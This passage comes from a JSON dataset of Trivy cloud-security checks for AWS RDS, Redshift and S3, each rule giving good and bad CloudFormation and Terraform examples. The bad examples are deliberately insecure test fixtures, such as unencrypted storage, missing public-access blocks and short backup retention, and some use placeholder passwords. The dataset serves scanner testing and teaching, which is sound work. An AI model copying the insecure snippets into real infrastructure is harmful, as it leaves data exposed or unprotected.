        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            EnablePerformanceInsights: true\n            PerformanceInsightsKMSKeyId: something\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            EnablePerformanceInsights: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id\n  good:\n    - |-\n      resource \"aws_rds_cluster_instance\" \"good_example\" {\n        name                            = \"bar\"\n        performance_insights_enabled    = true\n        performance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n      }\n  bad:\n    - |-\n      resource \"aws_rds_cluster_instance\" \"bad_example\" {\n        name                            = \"bar\"\n        performance_insights_enabled    = false\n        performance_insights_kms_key_id = \"\"\n      }\n",
        "file_name": "enable_performance_insights.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/enable_performance_insights.yaml",
        "local_path": "aws/rds/enable_performance_insights.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      EnablePerformanceInsights: true\n      PerformanceInsightsKMSKeyId: something"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      EnablePerformanceInsights: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id"
            ],
            "good": [
              "resource \"aws_rds_cluster_instance\" \"good_example\" {\n  name                            = \"bar\"\n  performance_insights_enabled    = true\n  performance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n}"
            ],
            "bad": [
              "resource \"aws_rds_cluster_instance\" \"bad_example\" {\n  name                            = \"bar\"\n  performance_insights_enabled    = false\n  performance_insights_kms_key_id = \"\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-ENCRYPT_CLUSTER_STORAGE_DATA",
        "title": "Encrypt Cluster Storage Data",
        "provider": "aws",
        "service": "rds",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBCluster\n          Properties:\n            KmsKeyId: something\n            StorageEncrypted: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBCluster\n          Properties:\n            StorageEncrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster\n  good:\n    - |-\n      resource \"aws_rds_cluster\" \"good_example\" {\n        name              = \"bar\"\n        kms_key_id        = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n        storage_encrypted = true\n      }\n  bad:\n    - |-\n      resource \"aws_rds_cluster\" \"bad_example\" {\n        name       = \"bar\"\n        kms_key_id = \"\"\n      }\n    - |-\n      resource \"aws_rds_cluster\" \"bad_example\" {\n        name              = \"bar\"\n        storage_encrypted = true\n      }\n",
        "file_name": "encrypt_cluster_storage_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/encrypt_cluster_storage_data.yaml",
        "local_path": "aws/rds/encrypt_cluster_storage_data.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBCluster\n    Properties:\n      KmsKeyId: something\n      StorageEncrypted: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBCluster\n    Properties:\n      StorageEncrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster"
            ],
            "good": [
              "resource \"aws_rds_cluster\" \"good_example\" {\n  name              = \"bar\"\n  kms_key_id        = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n  storage_encrypted = true\n}"
            ],
            "bad": [
              "resource \"aws_rds_cluster\" \"bad_example\" {\n  name       = \"bar\"\n  kms_key_id = \"\"\n}",
              "resource \"aws_rds_cluster\" \"bad_example\" {\n  name              = \"bar\"\n  storage_encrypted = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-ENCRYPT_INSTANCE_STORAGE_DATA",
        "title": "Encrypt Instance Storage Data",
        "provider": "aws",
        "service": "rds",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            KmsKeyId: something\n            StorageEncrypted: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            StorageEncrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance\n  good:\n    - |-\n      resource \"aws_db_instance\" \"good_example\" {\n        storage_encrypted = true\n      }\n  bad:\n    - |-\n      resource \"aws_db_instance\" \"bad_example\" {\n\n      }\n",
        "file_name": "encrypt_instance_storage_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/encrypt_instance_storage_data.yaml",
        "local_path": "aws/rds/encrypt_instance_storage_data.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      KmsKeyId: something\n      StorageEncrypted: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      StorageEncrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance"
            ],
            "good": [
              "resource \"aws_db_instance\" \"good_example\" {\n  storage_encrypted = true\n}"
            ],
            "bad": [
              "resource \"aws_db_instance\" \"bad_example\" {\n\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-PERFORMANCE_INSIGHTS_ENCRYPTION_CUSTOMER_KEY",
        "title": "Performance Insights Encryption Customer Key",
        "provider": "aws",
        "service": "rds",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            EnablePerformanceInsights: true\n            PerformanceInsightsKMSKeyId: something\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            EnablePerformanceInsights: true\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id\n  good:\n    - |-\n      resource \"aws_rds_cluster_instance\" \"good_example\" {\n        name                            = \"bar\"\n        performance_insights_enabled    = true\n        performance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n      }\n    - |-\n      resource \"aws_rds_cluster_instance\" \"good_example\" {\n        name                         = \"bar\"\n        performance_insights_enabled = false\n      }\n  bad:\n    - |-\n      resource \"aws_rds_cluster_instance\" \"bad_example\" {\n        name                            = \"bar\"\n        performance_insights_enabled    = true\n        performance_insights_kms_key_id = \"\"\n      }\n",
        "file_name": "performance_insights_encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/performance_insights_encryption_customer_key.yaml",
        "local_path": "aws/rds/performance_insights_encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      EnablePerformanceInsights: true\n      PerformanceInsightsKMSKeyId: something"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      EnablePerformanceInsights: true"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id"
            ],
            "good": [
              "resource \"aws_rds_cluster_instance\" \"good_example\" {\n  name                            = \"bar\"\n  performance_insights_enabled    = true\n  performance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n}",
              "resource \"aws_rds_cluster_instance\" \"good_example\" {\n  name                         = \"bar\"\n  performance_insights_enabled = false\n}"
            ],
            "bad": [
              "resource \"aws_rds_cluster_instance\" \"bad_example\" {\n  name                            = \"bar\"\n  performance_insights_enabled    = true\n  performance_insights_kms_key_id = \"\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-RDS-SPECIFY_BACKUP_RETENTION",
        "title": "Specify Backup Retention",
        "provider": "aws",
        "service": "rds",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::RDS::DBInstance\n          Properties:\n            BackupRetentionPeriod: 30\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::RDS::DBInstance\n          Properties: null\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster#backup_retention_period\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#backup_retention_period\n  good:\n    - |-\n      resource \"aws_rds_cluster\" \"good_example\" {\n        cluster_identifier      = \"aurora-cluster-demo\"\n        engine                  = \"aurora-mysql\"\n        engine_version          = \"5.7.mysql_aurora.2.03.2\"\n        availability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n        database_name           = \"mydb\"\n        master_username         = \"foo\"\n        master_password         = \"bar\"\n        backup_retention_period = 5\n        preferred_backup_window = \"07:00-09:00\"\n      }\n    - |-\n      resource \"aws_db_instance\" \"good_example\" {\n        allocated_storage       = 10\n        engine                  = \"mysql\"\n        engine_version          = \"5.7\"\n        instance_class          = \"db.t3.micro\"\n        name                    = \"mydb\"\n        username                = \"foo\"\n        password                = \"foobarbaz\"\n        parameter_group_name    = \"default.mysql5.7\"\n        backup_retention_period = 5\n        skip_final_snapshot     = true\n      }\n  bad:\n    - |-\n      resource \"aws_db_instance\" \"bad_example\" {\n        allocated_storage       = 10\n        engine                  = \"mysql\"\n        engine_version          = \"5.7\"\n        instance_class          = \"db.t3.micro\"\n        name                    = \"mydb\"\n        username                = \"foo\"\n        password                = \"foobarbaz\"\n        parameter_group_name    = \"default.mysql5.7\"\n        backup_retention_period = 1\n        skip_final_snapshot     = true\n      }\n    - |-\n      resource \"aws_db_instance\" \"bad_example\" {\n        allocated_storage    = 10\n        engine               = \"mysql\"\n        engine_version       = \"5.7\"\n        instance_class       = \"db.t3.micro\"\n        name                 = \"mydb\"\n        username             = \"foo\"\n        password             = \"foobarbaz\"\n        parameter_group_name = \"default.mysql5.7\"\n        skip_final_snapshot  = true\n      }\n    - |-\n      resource \"aws_rds_cluster\" \"bad_example\" {\n        cluster_identifier      = \"aurora-cluster-demo\"\n        engine                  = \"aurora-mysql\"\n        engine_version          = \"5.7.mysql_aurora.2.03.2\"\n        availability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n        database_name           = \"mydb\"\n        master_username         = \"foo\"\n        master_password         = \"bar\"\n        preferred_backup_window = \"07:00-09:00\"\n      }\n",
        "file_name": "specify_backup_retention.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/rds/specify_backup_retention.yaml",
        "local_path": "aws/rds/specify_backup_retention.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::RDS::DBInstance\n    Properties:\n      BackupRetentionPeriod: 30"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::RDS::DBInstance\n    Properties: null"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster#backup_retention_period",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#backup_retention_period"
            ],
            "good": [
              "resource \"aws_rds_cluster\" \"good_example\" {\n  cluster_identifier      = \"aurora-cluster-demo\"\n  engine                  = \"aurora-mysql\"\n  engine_version          = \"5.7.mysql_aurora.2.03.2\"\n  availability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n  database_name           = \"mydb\"\n  master_username         = \"foo\"\n  master_password         = \"bar\"\n  backup_retention_period = 5\n  preferred_backup_window = \"07:00-09:00\"\n}",
              "resource \"aws_db_instance\" \"good_example\" {\n  allocated_storage       = 10\n  engine                  = \"mysql\"\n  engine_version          = \"5.7\"\n  instance_class          = \"db.t3.micro\"\n  name                    = \"mydb\"\n  username                = \"foo\"\n  password                = \"foobarbaz\"\n  parameter_group_name    = \"default.mysql5.7\"\n  backup_retention_period = 5\n  skip_final_snapshot     = true\n}"
            ],
            "bad": [
              "resource \"aws_db_instance\" \"bad_example\" {\n  allocated_storage       = 10\n  engine                  = \"mysql\"\n  engine_version          = \"5.7\"\n  instance_class          = \"db.t3.micro\"\n  name                    = \"mydb\"\n  username                = \"foo\"\n  password                = \"foobarbaz\"\n  parameter_group_name    = \"default.mysql5.7\"\n  backup_retention_period = 1\n  skip_final_snapshot     = true\n}",
              "resource \"aws_db_instance\" \"bad_example\" {\n  allocated_storage    = 10\n  engine               = \"mysql\"\n  engine_version       = \"5.7\"\n  instance_class       = \"db.t3.micro\"\n  name                 = \"mydb\"\n  username             = \"foo\"\n  password             = \"foobarbaz\"\n  parameter_group_name = \"default.mysql5.7\"\n  skip_final_snapshot  = true\n}",
              "resource \"aws_rds_cluster\" \"bad_example\" {\n  cluster_identifier      = \"aurora-cluster-demo\"\n  engine                  = \"aurora-mysql\"\n  engine_version          = \"5.7.mysql_aurora.2.03.2\"\n  availability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n  database_name           = \"mydb\"\n  master_username         = \"foo\"\n  master_password         = \"bar\"\n  preferred_backup_window = \"07:00-09:00\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-REDSHIFT-ADD_DESCRIPTION_TO_SECURITY_GROUP",
        "title": "Add Description To Security Group",
        "provider": "aws",
        "service": "redshift",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Redshift::ClusterSecurityGroup\n          Properties:\n            Description: Disallow bad stuff\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Redshift::ClusterSecurityGroup\n          Properties:\n            Description: \"\"\n",
        "file_name": "add_description_to_security_group.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/redshift/add_description_to_security_group.yaml",
        "local_path": "aws/redshift/add_description_to_security_group.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Redshift::ClusterSecurityGroup\n    Properties:\n      Description: Disallow bad stuff"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Redshift::ClusterSecurityGroup\n    Properties:\n      Description: \"\""
            ]
          }
        }
      },
      {
        "rule_id": "AWS-REDSHIFT-ENCRYPTION_CUSTOMER_KEY",
        "title": "Encryption Customer Key",
        "provider": "aws",
        "service": "redshift",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::Redshift::Cluster\n          Properties:\n            Encrypted: true\n            KmsKeyId: something\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::Redshift::Cluster\n          Properties:\n            Encrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#encrypted\n  good:\n    - |-\n      resource \"aws_kms_key\" \"redshift\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_redshift_cluster\" \"good_example\" {\n        cluster_identifier = \"tf-redshift-cluster\"\n        database_name      = \"mydb\"\n        master_username    = \"foo\"\n        master_password    = \"Mustbe8characters\"\n        node_type          = \"dc1.large\"\n        cluster_type       = \"single-node\"\n        encrypted          = true\n        kms_key_id         = aws_kms_key.redshift.key_id\n      }\n  bad:\n    - |-\n      resource \"aws_redshift_cluster\" \"bad_example\" {\n        cluster_identifier = \"tf-redshift-cluster\"\n        database_name      = \"mydb\"\n        master_username    = \"foo\"\n        master_password    = \"Mustbe8characters\"\n        node_type          = \"dc1.large\"\n        cluster_type       = \"single-node\"\n      }\n",
        "file_name": "encryption_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/redshift/encryption_customer_key.yaml",
        "local_path": "aws/redshift/encryption_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::Redshift::Cluster\n    Properties:\n      Encrypted: true\n      KmsKeyId: something"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::Redshift::Cluster\n    Properties:\n      Encrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#encrypted"
            ],
            "good": [
              "resource \"aws_kms_key\" \"redshift\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_redshift_cluster\" \"good_example\" {\n  cluster_identifier = \"tf-redshift-cluster\"\n  database_name      = \"mydb\"\n  master_username    = \"foo\"\n  master_password    = \"Mustbe8characters\"\n  node_type          = \"dc1.large\"\n  cluster_type       = \"single-node\"\n  encrypted          = true\n  kms_key_id         = aws_kms_key.redshift.key_id\n}"
            ],
            "bad": [
              "resource \"aws_redshift_cluster\" \"bad_example\" {\n  cluster_identifier = \"tf-redshift-cluster\"\n  database_name      = \"mydb\"\n  master_username    = \"foo\"\n  master_password    = \"Mustbe8characters\"\n  node_type          = \"dc1.large\"\n  cluster_type       = \"single-node\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-REDSHIFT-NO_CLASSIC_RESOURCES",
        "title": "No Classic Resources",
        "provider": "aws",
        "service": "redshift",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Good example of redshift sgr\n\n      Resources:\n        myCluster:\n          Type: AWS::Redshift::Cluster\n          Properties:\n            DBName: mydb\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Description: Bad example of redshift sgr\n\n      Resources:\n        SecGroup:\n          Type: AWS::Redshift::ClusterSecurityGroup\n          Properties:\n            Description: \"\"\n",
        "file_name": "no_classic_resources.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/redshift/no_classic_resources.yaml",
        "local_path": "aws/redshift/no_classic_resources.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Good example of redshift sgr\n\nResources:\n  myCluster:\n    Type: AWS::Redshift::Cluster\n    Properties:\n      DBName: mydb"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nDescription: Bad example of redshift sgr\n\nResources:\n  SecGroup:\n    Type: AWS::Redshift::ClusterSecurityGroup\n    Properties:\n      Description: \"\""
            ]
          }
        }
      },
      {
        "rule_id": "AWS-REDSHIFT-USE_VPC",
        "title": "Use Vpc",
        "provider": "aws",
        "service": "redshift",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodCluster:\n          Type: AWS::Redshift::Cluster\n          Properties:\n            ClusterSubnetGroupName: my-subnet-group\n  bad:\n    - |-\n      Resources:\n        BadCluster:\n          Type: AWS::Redshift::Cluster\n          Properties:\n            DBName: mydb\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#cluster_subnet_group_name\n  good:\n    - |-\n      resource \"aws_redshift_cluster\" \"good_example\" {\n        cluster_identifier        = \"tf-redshift-cluster\"\n        database_name             = \"mydb\"\n        cluster_subnet_group_name = \"redshift_subnet\"\n      }\n  bad:\n    - |-\n      resource \"aws_redshift_cluster\" \"bad_example\" {\n        cluster_identifier = \"tf-redshift-cluster\"\n        database_name      = \"mydb\"\n      }\n",
        "file_name": "use_vpc.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/redshift/use_vpc.yaml",
        "local_path": "aws/redshift/use_vpc.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodCluster:\n    Type: AWS::Redshift::Cluster\n    Properties:\n      ClusterSubnetGroupName: my-subnet-group"
            ],
            "bad": [
              "Resources:\n  BadCluster:\n    Type: AWS::Redshift::Cluster\n    Properties:\n      DBName: mydb"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#cluster_subnet_group_name"
            ],
            "good": [
              "resource \"aws_redshift_cluster\" \"good_example\" {\n  cluster_identifier        = \"tf-redshift-cluster\"\n  database_name             = \"mydb\"\n  cluster_subnet_group_name = \"redshift_subnet\"\n}"
            ],
            "bad": [
              "resource \"aws_redshift_cluster\" \"bad_example\" {\n  cluster_identifier = \"tf-redshift-cluster\"\n  database_name      = \"mydb\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-BLOCK_PUBLIC_ACLS",
        "title": "Block Public Acls",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            PublicAccessBlockConfiguration:\n              BlockPublicAcls: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_acls\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n        bucket            = aws_s3_bucket.good_example.id\n        block_public_acls = true\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket = aws_s3_bucket.bad_example.id\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket            = aws_s3_bucket.bad_example.id\n        block_public_acls = false\n      }\n",
        "file_name": "block_public_acls.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/block_public_acls.yaml",
        "local_path": "aws/s3/block_public_acls.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      PublicAccessBlockConfiguration:\n        BlockPublicAcls: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_acls"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n  bucket            = aws_s3_bucket.good_example.id\n  block_public_acls = true\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.bad_example.id\n}",
              "resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket            = aws_s3_bucket.bad_example.id\n  block_public_acls = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-BLOCK_PUBLIC_POLICY",
        "title": "Block Public Policy",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            PublicAccessBlockConfiguration:\n              BlockPublicPolicy: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_policy\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n        bucket              = aws_s3_bucket.example.id\n        block_public_policy = true\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket = aws_s3_bucket.example.id\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"example\" {\n        bucket = \"mybucket\"\n      }\n      resource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n        bucket              = aws_s3_bucket.example.id\n        block_public_policy = false\n      }\n",
        "file_name": "block_public_policy.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/block_public_policy.yaml",
        "local_path": "aws/s3/block_public_policy.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::S3::Bucket\n    Properties:\n      PublicAccessBlockConfiguration:\n        BlockPublicPolicy: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::S3::Bucket"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_policy"
            ],
            "good": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n  bucket              = aws_s3_bucket.example.id\n  block_public_policy = true\n}"
            ],
            "bad": [
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.example.id\n}",
              "resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"mybucket\"\n}\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket              = aws_s3_bucket.example.id\n  block_public_policy = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-S3-ENABLE_BUCKET_ENCRYPTION",
        "title": "Enable Bucket Encryption",
        "provider": "aws",
        "service": "s3",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::S3::Bucket\n          Properties:\n            BucketEncryption:\n              ServerSideEncryptionConfiguration:\n                - BucketKeyEnabled: true\n                  ServerSideEncryptionByDefault:\n                    SSEAlgorithm: AES256\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::S3::Bucket\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket#enable-default-server-side-encryption\n  good:\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"mybucket\"\n\n        server_side_encryption_configuration {\n          rule {\n            apply_server_side_encryption_by_default {\n              kms_master_key_id = \"arn\"\n              sse_algorithm     = \"aws:kms\"\n            }\n          }\n        }\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"good_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n        bucket = aws_s3_bucket.good_example.id\n\n        rule {\n          apply_server_side_encryption_by_default {\n            kms_master_key_id = aws_kms_key.mykey.arn\n            sse_algorithm     = \"aws:kms\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"mybucket\"\n      }\n    - |-\n      resource \"aws_s3_bucket\" \"bad_example\" {\n        bucket = \"mybucket\"\n      }\n\n      resource \"aws_s3_bucket_server_side_encryption_configuration\" \"example\" {\n        bucket = aws_s3_bucket.bad_example.id\n\n        rule {}\n      }\n",
        "file_name": "enable_bucket_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/s3/enable_bucket_encryption.yaml",
        "local_path": "aws/s3/enable_bucket_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
